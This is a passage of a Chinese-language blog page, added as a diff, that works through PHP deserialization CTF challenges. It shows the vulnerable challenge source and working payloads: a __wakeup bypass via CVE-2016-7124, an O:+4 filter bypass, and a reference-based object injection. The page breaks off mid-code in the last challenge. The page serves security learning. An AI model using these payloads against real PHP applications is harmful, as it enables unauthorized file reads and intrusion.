@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function () {
+        if ('') {
+            if (prompt('请输入文章密码') !== '') {
+                alert('密码错误！');
+                if (history.length === 1) {
+                    location.replace("https://evenyao.com"); // 这里替换成你的首页
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/zx.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="serialize():将一个对象转换成一个字符串unserialize():将字符串还原成一个对象 123456789&lt;?php	class A	&amp;#123;		public $name&#x3D;&quot;w1ndy&quot;;		private $hobby&#x3D;&quot;basketball&quot;;	&amp;#125;	$a&#x3D;new A();	echo serialize($a);?&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反序列化">
+<meta property="og:url" content="http://yoursite.com/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="w1ndy">
+<meta property="og:description" content="serialize():将一个对象转换成一个字符串unserialize():将字符串还原成一个对象 123456789&lt;?php	class A	&amp;#123;		public $name&#x3D;&quot;w1ndy&quot;;		private $hobby&#x3D;&quot;basketball&quot;;	&amp;#125;	$a&#x3D;new A();	echo serialize($a);?&gt;">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/unserialize/unserialize_0.PNG">
+<meta property="og:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/NiZhuanSiWei/NiZhuanSiWei.jpg">
+<meta property="article:published_time" content="2020-04-25T14:47:19.000Z">
+<meta property="article:modified_time" content="2020-07-01T04:04:43.670Z">
+<meta property="article:author" content="w1ndy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/zxfireworks/BlogPic/raw/master/unserialize/unserialize_0.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/25/反序列化/"/>
+
+
+
+
+
+  <title>反序列化 | w1ndy</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w1ndy</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w1ndy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w1ndy">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">反序列化</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-25T22:47:19+08:00">
+                2020-04-25
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-07-01T12:04:43+08:00">
+                2020-07-01
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF-Web/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF-Web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>serialize():将一个对象转换成一个字符串<br>unserialize():将字符串还原成一个对象</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class A</span><br><span class="line">	&#123;</span><br><span class="line">		public <span class="variable">$name</span>=<span class="string">"w1ndy"</span>;</span><br><span class="line">		private <span class="variable">$hobby</span>=<span class="string">"basketball"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span>=new A();</span><br><span class="line">	<span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>结果为</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:<span class="string">"A"</span>:2:&#123;s:4:<span class="string">"name"</span>;s:5:<span class="string">"w1ndy"</span>;s:8:<span class="string">"Ahobby"</span>;s:10:<span class="string">"basketball"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>第一个O表示Object，也就是对象，对象名字长度为1，对象名为A,该对象有两个属性(name和hobby)。<br>第一个属性是string类型，属性名长度为4，属性名为name,接着的w1ndy是属性name的值，长度为5.    (public)<br>第二个属性hobby与第一个类似，但是最大的区别就在于属性序列化后的名字是(类名+属性名)，且长度=(属性名长度+2),多加的这两个字符是%00,并不会显示出来，也可以写成这样:%00A%00hobby          (private)<br>在传入序列化字符串进行反序列化时要注意补齐两个空字节<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/unserialize/unserialize_0.PNG" alt=""></p>
+<h3 id="极客大挑战-2019-PHP-wakeup-函数绕过"><a href="#极客大挑战-2019-PHP-wakeup-函数绕过" class="headerlink" title="[极客大挑战 2019]PHP(__wakeup()函数绕过)"></a>[极客大挑战 2019]PHP(__wakeup()函数绕过)</h3><p>页面提示网站备份，测试index.php.bak没找到，扫下目录，发现<a href="http://www.zip,下载下来后" target="_blank" rel="noopener">www.zip,下载下来后</a><br>在index.php中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include <span class="string">'class.php'</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">'select'</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+<p>在class.php中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Name&#123;</span><br><span class="line">    private <span class="variable">$username</span> = <span class="string">'nonono'</span>;</span><br><span class="line">    private <span class="variable">$password</span> = <span class="string">'yesyes'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$username</span>,<span class="variable">$password</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;password != 100) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;username;<span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;password;<span class="built_in">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            global <span class="variable">$flag</span>;</span><br><span class="line">            <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>要想拿到flag，必须满足:username=admin&amp;password=100<br>这里password很容易满足，但是username不然，传入的字符串进行反序列化时会触发<strong>wakeup()函数，username的值会被代替为”guest”，从而无法满足条件<br>绕过方法：当反序列化字符串中表示的属性个数大于真实属性个数时，会跳过 __wakeup 函数的执行<br>在这里就是利用这一点<br>构造payload：?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;s:3:”100”;}<br>这里本来Name类有两个属性，为了跳过</strong>wakeup()函数，修改属性个数(要大于本来的个数)为3，成功拿到flag<br><a href="http://vulhub.org.cn/vuln/VH-CVE-2016-7124" target="_blank" rel="noopener">CVE-2016-7124</a></p>
+<h3 id="攻防世界-Web-php-unserialize"><a href="#攻防世界-Web-php-unserialize" class="headerlink" title="[攻防世界]Web_php_unserialize"></a>[攻防世界]Web_php_unserialize</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class Demo &#123; </span><br><span class="line">    private <span class="variable">$file</span> = <span class="string">'index.php'</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct(<span class="variable">$file</span>) &#123; </span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123; </span><br><span class="line">        <span class="built_in">echo</span> @highlight_file(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>() &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            //the secret is <span class="keyword">in</span> the fl4g.php</span><br><span class="line">            <span class="variable">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = base64_decode(<span class="variable">$_GET</span>[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, <span class="variable">$var</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        die(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        @unserialize(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>未绕过前：<br>``bash<br>O:4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">在序列化字符串中对象的长度处过滤了数字,用+4替换成4是可绕过这一点</span><br><span class="line">再利用__wakeup()函数的漏洞跳过__wakeup函数执行</span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">&lt;?php</span><br><span class="line">	class Demo</span><br><span class="line">	&#123;</span><br><span class="line">		private $file &#x3D; &#39;fl4g.php&#39;;</span><br><span class="line">	&#125;</span><br><span class="line">	$a&#x3D;new Demo();</span><br><span class="line">	$b &#x3D; serialize($a);</span><br><span class="line">	$b &#x3D; str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$b);</span><br><span class="line">    $b &#x3D; str_replace(&#39;:1:&#39;, &#39;:3:&#39;,$b);</span><br><span class="line">    echo (base64_encode($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>payload:?var=TzorNDoiRGVtbyI6Mzp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==<br>tip:这里有个坑，因为privite属性的值在序列化时名字中会有%00,序列化字符中并没有打印出来，不要手动绕过，否则很容易去掉隐藏的字符，导致payload错误</p>
+<h3 id="安恒月赛-Ezunserialize"><a href="#安恒月赛-Ezunserialize" class="headerlink" title="[安恒月赛]Ezunserialize"></a>[安恒月赛]Ezunserialize</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> write(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> str_replace(chr(0) . <span class="string">'*'</span> . chr(0), <span class="string">'\0\0\0'</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">read</span>(<span class="variable">$data</span>) &#123;</span><br><span class="line">    <span class="built_in">return</span> str_replace(<span class="string">'\0\0\0'</span>, chr(0) . <span class="string">'*'</span> . chr(0), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line">class A&#123;</span><br><span class="line">    public <span class="variable">$username</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">function</span> __construct(<span class="variable">$a</span>, <span class="variable">$b</span>)&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class B&#123;</span><br><span class="line">    public <span class="variable">$b</span> = <span class="string">'gqy'</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">'a'</span>.<span class="variable">$this</span>-&gt;b;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class C&#123;</span><br><span class="line">    public <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__toString</span></span>()&#123;</span><br><span class="line">        //flag.php</span><br><span class="line">        <span class="built_in">echo</span> file_get_contents(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        <span class="built_in">return</span> <span class="string">'nice'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new A(<span class="variable">$_GET</span>[<span class="string">'a'</span>],<span class="variable">$_GET</span>[<span class="string">'b'</span>]);</span><br><span class="line">//省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line"><span class="variable">$b</span> = unserialize(<span class="built_in">read</span>(write(serialize(<span class="variable">$a</span>))));</span><br></pre></td></tr></table></figure>
+<h3 id="BUU-CODE-REVIEW-1"><a href="#BUU-CODE-REVIEW-1" class="headerlink" title="BUU CODE REVIEW 1"></a>BUU CODE REVIEW 1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class BUU &#123;</span><br><span class="line">   public <span class="variable">$correct</span> = <span class="string">""</span>;</span><br><span class="line">   public <span class="variable">$input</span> = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;correct === <span class="variable">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="built_in">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'pleaseget'</span>] === <span class="string">'1'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'pleasepost'</span>] === <span class="string">'2'</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="variable">$_POST</span>[<span class="string">'md51'</span>]) == md5(<span class="variable">$_POST</span>[<span class="string">'md52'</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">'md51'</span>] != <span class="variable">$_POST</span>[<span class="string">'md52'</span>]) &#123;</span><br><span class="line">            unserialize(<span class="variable">$_POST</span>[<span class="string">'obj'</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先是一堆绕过，然后反序列化<br>绕过很简单，重点在反序列化</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class BUU &#123;</span><br><span class="line">   public <span class="variable">$correct</span> = <span class="string">""</span>;</span><br><span class="line">   public <span class="variable">$input</span> = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>() &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;correct = base64_encode(uniqid());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;correct === <span class="variable">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="built_in">echo</span> file_get_contents(<span class="string">"/flag"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = new BUU();</span><br><span class="line"><span class="variable">$a</span>-&gt;input=&amp;<span class="variable">$a</span>-&gt;correct; //关键点</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$a</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>构造payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">以get方式传参   ?pleaseget=1</span><br><span class="line">以post方式传参      pleasepost=2&amp;md51[]=a&amp;md52[]=b&amp;obj=O:3:<span class="string">"BUU"</span>:2:&#123;s:7:<span class="string">"correct"</span>;s:0:<span class="string">""</span>;s:5:<span class="string">"input"</span>;R:2;&#125;</span><br></pre></td></tr></table></figure>
+<p>拿到flag{4f080ca0-191d-44f7-a076-790e8210cf87} </p>
+<h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="built_in">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  //useless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        <span 